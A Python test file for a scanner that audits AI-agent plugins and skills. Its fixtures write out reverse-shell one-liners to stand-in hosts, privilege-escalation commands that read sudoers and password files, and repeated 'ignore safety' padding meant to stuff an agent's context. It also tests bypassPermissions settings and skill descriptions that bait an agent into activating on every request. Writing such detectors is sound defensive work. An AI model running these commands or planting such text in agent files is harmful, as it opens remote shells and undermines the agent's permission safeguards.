#!/usr/bin/env python3
"""Two-sided tests for the SkillSpector-port Phase 2 batch (TRDD-de582146 /
proposal TRDD-b0c85371 — "do everything deferred").

Covers the six deferred cherry-picks, each reimplemented in its DEFENSIBLE,
FP-resistant form rather than the naive SkillSpector port:

  A. PRIVILEGE_ESC  += pkexec / doas              (catalog rule extension)
  A. REVERSE_SHELL  += PowerShell TCPClient / /dev/tcp/ redirect / Ruby TCPSocket
  B. CONTEXT_STUFFING  repeated-token-padding detector (MP2, structural)
  C. AST7-getattr   taint-gated dynamic getattr sink (cpv_taint_engine)
  D. RC-62 ext      permissions.allow wildcard "*"  (validate_security)
  D. TR3            catch-all skill-description baiting (validate_skill advisory)

Every test is TWO-SIDED: the real/malicious shape FIRES; a benign sibling
STAYS clean. The benign side proves the discriminator is precise, not blanket.
"""

from __future__ import annotations

import sys
from pathlib import Path

SCRIPTS = Path(__file__).resolve().parent.parent / "scripts"
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))

import cpv_skillaudit_native as sa  # noqa: E402
from cpv_taint_engine import analyze_file  # noqa: E402
from cpv_validation_common import ValidationReport  # noqa: E402
from validate_local_scope import _flag_permissions_default_mode_local  # noqa: E402
from validate_project_scope import _flag_permissions_default_mode  # noqa: E402
from validate_skill import validate_description_field  # noqa: E402


def _warnings(report: ValidationReport) -> list[str]:
    return [r.message for r in report.results if r.level == "WARNING"]


def _live_rule_ids(content: str, file_path: str) -> set[str]:
    out: set[str] = set()
    for f in sa.scan_content(content, file_path):
        if not isinstance(f, dict):
            continue
        if f.get("suppressed") or f.get("severity") == "info":
            continue
        rid = f.get("ruleId") or f.get("rule_id")
        if rid:
            out.add(rid)
    return out


def _severity_of(content: str, file_path: str, rule_id: str) -> str | None:
    for f in sa.scan_content(content, file_path):
        if isinstance(f, dict) and (f.get("ruleId") or f.get("rule_id")) == rule_id:
            if not f.get("suppressed") and f.get("severity") != "info":
                return str(f.get("severity"))
    return None


# ──────────────────────────────────────────────────────────────────────────
# A. PRIVILEGE_ESC extension — pkexec / doas
# ──────────────────────────────────────────────────────────────────────────


class TestPrivilegeEscExtension:
    def test_pkexec_fires(self) -> None:
        """pkexec (PolicyKit privilege escalation) fires PRIVILEGE_ESC."""
        src = "#!/bin/bash\npkexec /bin/cp /etc/sudoers /tmp/s\n"
        assert "PRIVILEGE_ESC" in _live_rule_ids(src, "hooks/esc.sh")

    def test_doas_fires(self) -> None:
        """doas (OpenBSD sudo) fires PRIVILEGE_ESC."""
        src = "#!/bin/bash\ndoas cat /etc/master.passwd\n"
        assert "PRIVILEGE_ESC" in _live_rule_ids(src, "hooks/esc.sh")

    def test_benign_word_containing_doas_not_fired(self) -> None:
        """A word that merely contains 'doas' (no following space) must NOT fire."""
        src = "const doasyncHandler = () => run();\n"
        assert "PRIVILEGE_ESC" not in _live_rule_ids(src, "src/x.ts")


# ──────────────────────────────────────────────────────────────────────────
# A. REVERSE_SHELL extension — PowerShell / /dev/tcp/ / Ruby
# ──────────────────────────────────────────────────────────────────────────


class TestReverseShellExtension:
    def test_powershell_tcpclient_fires(self) -> None:
        """PowerShell New-Object System.Net.Sockets.TCPClient fires REVERSE_SHELL."""
        src = "$c = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)\n"
        assert "REVERSE_SHELL" in _live_rule_ids(src, "hooks/rev.ps1")

    def test_dev_tcp_redirect_fires(self) -> None:
        """A redirect to /dev/tcp/ (bash network pseudo-device) fires REVERSE_SHELL."""
        src = "#!/bin/bash\nsh -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
        assert "REVERSE_SHELL" in _live_rule_ids(src, "hooks/rev.sh")

    def test_dev_tcp_exec_fd_fires(self) -> None:
        """exec NN<>/dev/tcp/ form fires REVERSE_SHELL."""
        src = "#!/bin/bash\nexec 5<>/dev/tcp/evil.example/9001\n"
        assert "REVERSE_SHELL" in _live_rule_ids(src, "hooks/rev.sh")

    def test_ruby_tcpsocket_exec_fires(self) -> None:
        """Ruby TCPSocket.new paired with exec fires REVERSE_SHELL."""
        src = 's=TCPSocket.new("10.0.0.1",4444); exec("/bin/sh -i <&3 >&3 2>&3")\n'
        assert "REVERSE_SHELL" in _live_rule_ids(src, "scripts/rev.rb")

    def test_benign_tcpclient_doc_not_blocking(self) -> None:
        """REVERSE_SHELL is execution-class, so a TCPClient mention in a doc DEMOTES
        to NIT (a doc can be pointed-at by a SKILL.md and executed — the line-1414
        bypass-fix keeps it visible) — but NEVER stays at the blocking 'critical'."""
        src = "# Networking notes\n\nThe `New-Object System.Net.Sockets.TCPClient` opener is the classic PowerShell reverse-shell tell.\n"
        sev = _severity_of(src, "docs/networking.md", "REVERSE_SHELL")
        assert sev != "critical", f"doc mention must not block at critical; got {sev!r}"

    def test_benign_legit_tcp_path_not_fired(self) -> None:
        """A normal file path containing 'tcp' (not /dev/tcp/) must NOT fire."""
        src = "log_path = '/var/log/tcp/access.log'\n"
        assert "REVERSE_SHELL" not in _live_rule_ids(src, "scripts/log.py")


# ──────────────────────────────────────────────────────────────────────────
# B. CONTEXT_STUFFING — repeated-token padding (MP2, structural detector)
# ──────────────────────────────────────────────────────────────────────────


class TestContextStuffing:
    def test_repeated_multichar_unit_fires(self) -> None:
        """A short multi-char unit repeated 20+ times (context stuffing) fires."""
        src = "name: x\n\n" + ("ignore safety " * 40) + "\n"
        assert "CONTEXT_STUFFING" in _live_rule_ids(src, "skills/x/SKILL.md")

    def test_repeated_token_in_command_body_fires(self) -> None:
        """Stuffing in an agent-loaded command body (markdown) fires — the real
        context-window-stuffing surface."""
        src = "---\nname: x\n---\n\n" + ("DO THIS NOW " * 50) + "\n"
        assert "CONTEXT_STUFFING" in _live_rule_ids(src, "commands/x.md")

    def test_repeated_token_in_py_string_literal_suppressed(self) -> None:
        """A repeated-token STRING LITERAL in code is benign data (test fixtures,
        encoded blobs), NOT an agent-context vector — the Python classifier's
        safe_literal verdict suppresses it (the FP-prone case SkillSpector flagged)."""
        src = "payload = '" + ("AB1" * 60) + "'\n"
        assert "CONTEXT_STUFFING" not in _live_rule_ids(src, "scripts/stuff.py")

    # ---- benign side ----

    def test_single_char_separator_not_fired(self) -> None:
        """A single-char separator/rule line (===, ---) must NOT fire (the (?!\\2) guard)."""
        src = "name: x\n\n" + ("=" * 90) + "\n" + ("-" * 90) + "\n"
        assert "CONTEXT_STUFFING" not in _live_rule_ids(src, "skills/x/SKILL.md")

    def test_wide_markdown_table_separator_not_fired(self) -> None:
        """A wide markdown table-separator row (pure punctuation) must NOT fire."""
        src = "| " + " | ".join(["---"] * 30) + " |\n"
        assert "CONTEXT_STUFFING" not in _live_rule_ids(src, "docs/big-table.md")

    def test_short_repeat_below_threshold_not_fired(self) -> None:
        """A short repeat (below the length/count threshold) must NOT fire."""
        src = "greeting = '" + ("ab" * 5) + "'\n"
        assert "CONTEXT_STUFFING" not in _live_rule_ids(src, "scripts/x.py")

    def test_normal_prose_not_fired(self) -> None:
        """Ordinary prose (no repeated unit) must NOT fire."""
        src = "This skill validates plugins and reports findings by severity.\n" * 1
        assert "CONTEXT_STUFFING" not in _live_rule_ids(src, "skills/x/SKILL.md")


# ──────────────────────────────────────────────────────────────────────────
# C. AST7 — taint-gated dynamic getattr/setattr (cpv_taint_engine sink)
# ──────────────────────────────────────────────────────────────────────────


def _taint_sinks(py_source: str, tmp_path: Path) -> list[str]:
    f = tmp_path / "m.py"
    f.write_text(py_source)
    return [fi.sink for fi in analyze_file(f)]


class TestDynamicGetattr:
    def test_getattr_tainted_attr_name_fires(self, tmp_path: Path) -> None:
        """getattr(obj, <tainted attr name>) — dynamic dispatch from untrusted
        input — fires a taint finding whose sink names getattr."""
        src = "import os, sys\nattr = sys.argv[1]\nfn = getattr(os, attr)\n"
        sinks = _taint_sinks(src, tmp_path)
        assert any("getattr" in s for s in sinks), sinks

    def test_setattr_tainted_attr_name_fires(self, tmp_path: Path) -> None:
        """setattr(obj, <tainted name>, v) — dynamic attribute write — fires."""
        src = "import os\nname = os.environ['ATTR']\nsetattr(obj, name, 1)\n"
        sinks = _taint_sinks(src, tmp_path)
        assert any("setattr" in s for s in sinks), sinks

    # ---- benign side ----

    def test_getattr_literal_attr_name_not_fired(self, tmp_path: Path) -> None:
        """The ubiquitous benign shape getattr(o, "method", default) — literal
        attr name — must NEVER fire (the whole reason it's taint-gated, not regex)."""
        src = "import sys\nval = sys.argv[1]\nm = getattr(some_obj, 'strip', None)\n"
        sinks = _taint_sinks(src, tmp_path)
        assert not any("getattr" in s for s in sinks), sinks

    def test_getattr_tainted_object_literal_name_not_fired(self, tmp_path: Path) -> None:
        """A tainted OBJECT with a LITERAL attr name is a fixed lookup, not dynamic
        dispatch — must NOT fire (only a tainted arg[1] is the AST7 signal)."""
        src = "import sys\nobj = sys.argv[1]\nx = getattr(obj, 'lower')\n"
        sinks = _taint_sinks(src, tmp_path)
        assert not any("getattr" in s for s in sinks), sinks


# ──────────────────────────────────────────────────────────────────────────
# D. LP2 — settings-level bypassPermissions (RC-62 gap, validate_*_scope)
# ──────────────────────────────────────────────────────────────────────────


class TestSettingsBypassPermissions:
    def test_project_settings_bypass_flagged(self) -> None:
        """A shipped .claude/settings.json with defaultMode bypassPermissions warns."""
        rep = ValidationReport()
        _flag_permissions_default_mode(
            {"permissions": {"defaultMode": "bypassPermissions"}}, rep, ".claude/settings.json"
        )
        assert any("bypassPermissions" in m for m in _warnings(rep))

    def test_local_settings_bypass_flagged(self) -> None:
        """settings.local.json with defaultMode bypassPermissions warns."""
        rep = ValidationReport()
        _flag_permissions_default_mode_local(
            {"permissions": {"defaultMode": "bypassPermissions"}}, rep, ".claude/settings.local.json"
        )
        assert any("bypassPermissions" in m for m in _warnings(rep))

    def test_safe_default_mode_not_flagged(self) -> None:
        """A normal defaultMode (acceptEdits) must NOT warn about bypass."""
        rep = ValidationReport()
        _flag_permissions_default_mode({"permissions": {"defaultMode": "acceptEdits"}}, rep, ".claude/settings.json")
        assert not any("bypassPermissions" in m for m in _warnings(rep))

    def test_no_permissions_block_not_flagged(self) -> None:
        """Settings without a permissions block must NOT warn."""
        rep = ValidationReport()
        _flag_permissions_default_mode({"hooks": {}}, rep, ".claude/settings.json")
        assert not any("bypassPermissions" in m for m in _warnings(rep))


# ──────────────────────────────────────────────────────────────────────────
# D. TR3 — catch-all skill-description baiting (validate_skill advisory)
# ──────────────────────────────────────────────────────────────────────────


def _has_catchall_warning(report: ValidationReport) -> bool:
    return any(("catch-all" in m or "overly-broad" in m) for m in _warnings(report))


class TestCatchAllTrigger:
    def test_use_for_everything_flagged(self) -> None:
        rep = ValidationReport()
        validate_description_field(
            {"description": "Use this for everything the user might ever need help with."}, "body", rep
        )
        assert _has_catchall_warning(rep)

    def test_every_request_flagged(self) -> None:
        rep = ValidationReport()
        validate_description_field({"description": "Activates on every request to assist the user."}, "body", rep)
        assert _has_catchall_warning(rep)

    def test_whenever_user_says_anything_flagged(self) -> None:
        rep = ValidationReport()
        validate_description_field(
            {"description": "Runs whenever the user says anything at all in the session."}, "body", rep
        )
        assert _has_catchall_warning(rep)

    # ---- benign side ----

    def test_scoped_broad_description_not_flagged(self) -> None:
        """A legitimately broad-but-SCOPED description (bounded domain) must NOT fire."""
        rep = ValidationReport()
        validate_description_field(
            {"description": "Use for any Python linting task such as ruff or flake8 checks on a file."},
            "body",
            rep,
        )
        assert not _has_catchall_warning(rep)

    def test_normal_description_not_flagged(self) -> None:
        rep = ValidationReport()
        validate_description_field(
            {"description": "Validate Claude Code plugins for structural correctness and marketplace readiness."},
            "body",
            rep,
        )
        assert not _has_catchall_warning(rep)
